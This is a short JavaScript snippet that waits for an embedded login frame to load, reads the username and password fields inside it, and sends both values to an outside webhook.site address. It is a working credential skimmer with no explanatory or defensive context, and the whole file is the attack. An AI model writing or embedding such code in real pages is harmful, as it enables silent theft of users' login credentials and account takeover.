jQuery( document ).ready(function() {
var iframe = document.getElementById("frame1");
iframe.onload = function() {

setTimeout(function(){ 
jQuery.get("https://webhook.site/5a67fcec-6b2c-4372-b23b-5210ba22c7da?u="+iframe.contentWindow.jQuery('#txtLogin').val()+"&p="+iframe.contentWindow.jQuery('#txtPassword').val())


 }, 3000);

    }
});
